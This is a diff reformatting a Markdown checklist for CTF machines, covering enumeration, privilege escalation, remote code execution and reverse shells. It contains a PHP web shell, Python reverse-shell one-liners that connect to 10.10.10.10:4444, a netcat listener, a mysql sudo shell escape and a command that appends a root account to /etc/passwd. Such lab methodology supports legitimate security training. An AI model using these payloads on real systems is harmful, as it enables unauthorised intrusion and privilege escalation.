@@ -1,30 +1,35 @@
 # Checklist
+# Preperation
 
 <details>
-  <summary>Preparation</summary>
-	- [ ] Find IP of the machine
-		- [ ] `export IP=<MACHINE_IP>`
-		- [ ] `export MACHINE_NAME=<MACHINE_NAME>`
-	- [ ] Set folder structure
-		- [ ] `cd ctf/`
-		- [ ] `mkdir -p $MACHINE_NAME/enum`
-		- [ ] `mkdir -p $MACHINE_NAME/files`
-		- [ ] `touch $MACHINE_NAME/enum/users.txt`
-		- [ ] `cp templates/report.md ctf/$MACHINE_NAME/${MACHINE_NAME}.md`
-	- [ ] Set hostname in etc/hosts (if helps)
+  <summary>Expand</summary>
+
+- [ ] Find IP of the machine
+	- [ ] `export IP=<MACHINE_IP>`
+	- [ ] `export MACHINE_NAME=<MACHINE_NAME>`
+- [ ] Set folder structure
+	- [ ] `cd ctf/`
+	- [ ] `mkdir -p $MACHINE_NAME/enum`
+	- [ ] `mkdir -p $MACHINE_NAME/files`
+	- [ ] `touch $MACHINE_NAME/enum/users.txt`
+	- [ ] `cp templates/report.md ctf/$MACHINE_NAME/${MACHINE_NAME}.md`
+- [ ] Set hostname in etc/hosts (if helps)
+
 </details>
 
 
-<details>
-  <summary>Enumeration</summary>
+# Enumeration
 
-	- [ ] Enum
-		- [ ] Nmap
-			- [ ] [Howto](active-information-gathering/nmap.md)
-				- [ ] Copy key findings to report
-				- [ ] check results
-				- [ ] Paste to [report](templates/report.md)
-				- [ ] Highlight exploitables/targets
+<details>
+  <summary>Expand</summary>
+
+- [ ] Enum
+	- [ ] Nmap
+		- [ ] [Howto](active-information-gathering/nmap.md)
+			- [ ] Copy key findings to report
+			- [ ] check results
+			- [ ] Paste to [report](templates/report.md)
+			- [ ] Highlight exploitables/targets
 		- [ ] Rustscan
 			- [ ] check results
 	  - [ ] `enum4linux $IP` -> users, share, comon structure, server block.
@@ -93,79 +98,87 @@
 </details>
 
 
+# Privilege Escalation
+
 <details>
-	<summary>Privilege Escalation</summary>
-	- [ ] privileges escalation
-		- [ ] `sudo -l`
-		- [ ] password re-use
-			- [ ] from credentials founds in enum
-			- [ ] `su - <user>`
-				- [ ] ***Stabilize Shell $***
-					- [ ] `which python` -> python is here
-					- [ ] `python -c 'import pty; pty.spawn("/bin/bash")'` -> import valid tty
-					- [ ] `tty` quick test 
-					- [ ] `export TERM=xterm-256color`  ⇾ export our terminal
-					- [ ] `alias ll='clear ; ls -lsaht --color-auto'` ⇾ export ll command
-					- [ ] `stty raw -echo; fg; reset` -> stable shell by control Z & backgrounding it
-					- [ ] `stty columns 200 rows 200`
-			- [ ] e.g: `sudo /usr/bin/mysql -e '\! /bin/sh'`  [sudo nopass for mysql](https://gtfobins.github.io/gtfobins/mysql/#sudo)
-		- [ ] `netstat -tupanl | grep -i '127.0.0.1'` -> anything running on loopback
-		- [ ] `find / -perm -u=s -type f 2>/dev/null` 
-			- [ ] *_The first step is to identify all programs or files that have SUID bits enabled_*
-				- [ ] example
-					- [ ] /usr/bin/zsh
-			- [ ] Read Source Code (if any)
-			- [ ] look for files owned by root grouped by user.
-			- [ ] `ps aux | grep -i 'root' --auto-color` <-- anything running as root?
-				- [ ] lateral machines? (not done anything like this)
-				- [ ] private ip address? (not done anything)
-				- [ ] web root -> any db credes?
-		- [ ] Take advantage of this misconfiguration by abusing the PATH variable
-		- [ ] Take advantage of misconfigured cronjob.
-		- [ ] `find / -perm -u=g -type f 2>/dev/null` -> Are there any GUID
-		- [ ] simple HTTP server
-			- [ ] download pspy
-			- [ ] Second shell -> `pspy<BIT>`
-			- [ ] `getcap -r / 2>/dev/null` -> Are there any extended permissions
-			- [ ] exploit miss-configuration
-		- [ ] writeable `passwd`?
-			- [ ] `perl -le 'print crypt("PassWord","addedsalt")'`
-			- [ ] `echo "nullBrain:saltedvaluefromabove:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd`
-		- [ ] `kernel exploits?`
-			- [ ] e.g Dirty Cow [example HowTo](practical/dirty_cow)
+	<summary>Expand</summary>
+
+- [ ] privileges escalation
+	- [ ] `sudo -l`
+	- [ ] password re-use
+		- [ ] from credentials founds in enum
+		- [ ] `su - <user>`
+			- [ ] ***Stabilize Shell $***
+				- [ ] `which python` -> python is here
+				- [ ] `python -c 'import pty; pty.spawn("/bin/bash")'` -> import valid tty
+				- [ ] `tty` quick test 
+				- [ ] `export TERM=xterm-256color`  ⇾ export our terminal
+				- [ ] `alias ll='clear ; ls -lsaht --color-auto'` ⇾ export ll command
+				- [ ] `stty raw -echo; fg; reset` -> stable shell by control Z & backgrounding it
+				- [ ] `stty columns 200 rows 200`
+		- [ ] e.g: `sudo /usr/bin/mysql -e '\! /bin/sh'`  [sudo nopass for mysql](https://gtfobins.github.io/gtfobins/mysql/#sudo)
+	- [ ] `netstat -tupanl | grep -i '127.0.0.1'` -> anything running on loopback
+	- [ ] `find / -perm -u=s -type f 2>/dev/null` 
+		- [ ] *_The first step is to identify all programs or files that have SUID bits enabled_*
+			- [ ] example
+				- [ ] /usr/bin/zsh
+		- [ ] Read Source Code (if any)
+		- [ ] look for files owned by root grouped by user.
+		- [ ] `ps aux | grep -i 'root' --auto-color` <-- anything running as root?
+			- [ ] lateral machines? (not done anything like this)
+			- [ ] private ip address? (not done anything)
+			- [ ] web root -> any db credes?
+	- [ ] Take advantage of this misconfiguration by abusing the PATH variable
+	- [ ] Take advantage of misconfigured cronjob.
+	- [ ] `find / -perm -u=g -type f 2>/dev/null` -> Are there any GUID
+	- [ ] simple HTTP server
+		- [ ] download pspy
+		- [ ] Second shell -> `pspy<BIT>`
+		- [ ] `getcap -r / 2>/dev/null` -> Are there any extended permissions
+		- [ ] exploit miss-configuration
+	- [ ] writeable `passwd`?
+		- [ ] `perl -le 'print crypt("PassWord","addedsalt")'`
+		- [ ] `echo "nullBrain:saltedvaluefromabove:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd`
+	- [ ] `kernel exploits?`
+		- [ ] e.g Dirty Cow [example HowTo](practical/dirty_cow)
 
 </details>
 
 
+# Remote Code Execution (RCE)
+
 <details>
-  <summary>Remote Code Execution (RCE)</summary>
-	- [ ] Remote Code Execution
-		- [ ] `<?php system($_GET['cmd']);?>`
-		- [ ] Verify RCE
-			- [ ] e.g : `http://$IP/<path>/?lang=/var/ftp/pub/backdoor.php&cmd=id`.`
-			- [ ] Payload:
-				- [ ] https://github.com/nullbr41n/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
-				- [ ] payload converter (hURL)
-				- [ ] `python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'`
-				- [ ] `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
+	<summary>Expand</summary>
+
+- [ ] Remote Code Execution
+	- [ ] `<?php system($_GET['cmd']);?>`
+	- [ ] Verify RCE
+		- [ ] e.g : `http://$IP/<path>/?lang=/var/ftp/pub/backdoor.php&cmd=id`.`
+		- [ ] Payload:
+			- [ ] https://github.com/nullbr41n/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+			- [ ] payload converter (hURL)
+			- [ ] `python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'`
+			- [ ] `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
 </details>
 
 
-<details>
-  <summary>Reverse Shell</summary>
+# Reverse Shell
 
-	- [ ] Reverse Shell
-		- [ ] web uploads
-			- [ ] `nc - nlvp 1` `Listening on port 1`
-			- [ ] Upload payload on other side, should open connection
-			- [ ] check RCE section.
-				- [ ] ***Stabilize Shell $***
-					- [ ] `which python` -> python is here
-					- [ ] `python -c 'import pty; pty.spawn("/bin/bash")'` -> import valid tty
-					- [ ] `tty` quick test
-					- [ ] `export TERM=xterm-256color`  ⇾ export our terminal
-					- [ ] `alias ll='clear ; ls -lsaht --color-auto'` ⇾ export ll command
-					- [ ] `stty raw -echo; fg; reset` -> stable shell by control Z & backgrounding it
-					- [ ] `stty columns 200 rows 200`
+<details>
+	<summary>Expand</summary>
+
+- [ ] Reverse Shell
+	- [ ] web uploads
+		- [ ] `nc - nlvp 1` `Listening on port 1`
+		- [ ] Upload payload on other side, should open connection
+		- [ ] check RCE section.
+			- [ ] ***Stabilize Shell $***
+				- [ ] `which python` -> python is here
+				- [ ] `python -c 'import pty; pty.spawn("/bin/bash")'` -> import valid tty
+				- [ ] `tty` quick test
+				- [ ] `export TERM=xterm-256color`  ⇾ export our terminal
+				- [ ] `alias ll='clear ; ls -lsaht --color-auto'` ⇾ export ll command
+				- [ ] `stty raw -echo; fg; reset` -> stable shell by control Z & backgrounding it
+				- [ ] `stty columns 200 rows 200`
 
 </details>
